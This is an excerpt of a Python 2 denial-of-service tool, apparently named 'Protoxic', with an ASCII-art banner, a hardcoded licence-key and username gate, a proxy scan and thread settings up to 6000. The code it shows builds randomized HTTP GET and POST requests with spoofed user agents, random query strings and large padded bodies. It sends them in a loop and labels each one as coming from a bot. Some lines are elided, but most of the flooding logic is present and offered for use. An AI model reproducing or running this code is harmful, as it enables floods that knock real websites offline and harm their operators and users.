...
print"\033[1;91m#############################################################################"
print"\033[1;92m##      \.'---.//|    #######################################################"
print"\033[1;94m## Good  |\./|  \/    ##                                ##   Trust me      ##"
print"\033[1;91m## Boy! _|.|.|_  \    ##                                ##                 ##"
print"\033[1;92m##     /(  ) ' '  \   ##           Coded by S0u1        ##     I'll        ##"
print"\033[1;94m##    |  \/   . |  \  ##            Art by S0u1         ##                 ##"
print"\033[1;91m##     \_/\__/| |     ##     Special Thanks to Pr0t0x1c ##                 ##"
print"\033[1;92m##      V  /V / |     ##                                ##     Bite        ##"
print"\033[1;94m##        /__/ /      #######################################################"
print"\033[1;91m#############################################################################"
print"\033[1;92m#############################################################################"
print"\033[1;94m##  /$$$$$$$                       /$$                         /$$         ##"
...
print"\033[1;92m## | $$  \ $$ /$$$$$$   /$$$$$$  /$$$$$$    /$$$$$$  /$$   /$$ /$$  /$$$$$$$#"
print"\033[1;94m## | $$$$$$$//$$__  $$ /$$__  $$|_  $$_/   /$$__  $$|  $$ /$$/| $$ /$$_____/#"
print"\033[1;91m## | $$____/| $$  \__/| $$  \ $$  | $$    | $$  \ $$ \  $$$$/ | $$| $$      #"
print"\033[1;92m## | $$     | $$      | $$  | $$  | $$ /$$| $$  | $$  >$$  $$ | $$| $$      #"
print"\033[1;94m## | $$     | $$      |  $$$$$$/  |  $$$$/|  $$$$$$/ /$$/\  $$| $$|  $$$$$$$#"
print"\033[1;91m## |__/     |__/       \______/    \___/   \______/ |__/  \__/|__/ \_______/#"
print"\033[1;92m#############################################################################"
print"\033[1;94m#############################################################################"
#Loading Test 4 Tool

###############
IHOPETHISWASTESYOURTIMEINTHESOURCE = "3be515e7f14859516372e61d30dffa19"
IFAWKINHATESKIDS = "S0u1" 

loop = 'true'
while (loop == 'true'):

    licence = raw_input("[!] LICENCE KEY : ")

    if (licence == IHOPETHISWASTESYOURTIMEINTHESOURCE):
        loop1 = 'true'
        while (loop1 == 'true'):
            l33thaxx0r = getpass.getpass("[!] USER : ")
            if (l33thaxx0r == IFAWKINHATESKIDS):
                print""
                print "[!] Logged in successfully as : " + l33thaxx0r
                loop = 'false'
                loop1 = 'false'
            else:
        ...
        print "Licence Key incorrect!"
#
print""
print"\033[1;91m[!]Loading Important Modules Please wait!!"
...
while n<2:
 try:
  ...
  if port in [80,443]:
   ...
   print"\nenter a valid port: 80 or 443"
 except:
  print"\nenter a number (80 or 443)"
while n<3:
 try:
  th=input("\n\nThreads:(99<threads<6001)\n>")
  if ((th<6001) and (th>89)):
   n+=1
  else:
   print"For better results limit your threads to that range"
 except:
  print"Enter a number between 700 and 5000"
while n<4:
 try:
...
p5+=ips
h+=p[0]
print"Coded by Ala, Protoxic, S0u1"
print"[+]Scan finished"
print"\nhttp/https:", len(h)
p4=p[2]
print"\nsocks4:", len(p4)
  ...
  while True:
   try:
    ...
    for l in range(random.randint(1,5)):
     ...
     if kl==1:
      k=""
      for gr in range(random.randint(1,5)):
       k+=random.choice(lis)+str(random.randint(1,1000))
      j=''
      for gr in range(random.randint(1,5)):
       j+=random.choice(lis)+str(random.randint(1,1000))
      if ("?" in pa):
       prj="&"
      else:
       prj="?"
      pa+=prj+k+"="+j
      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),u)
     else:
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,1000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      par=k+'='+(j*random.randint(100,300))+str(random.randint(1,1000))+random.choice(lis)+random.choice(lis)
      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),u,par)
     try:
      s.send(m)
      print"\033[1;91m[!] Request sent | \033[1;94mS0u1Bot: {} | \033[1;92mThread: {}".format(ipp,c+1)
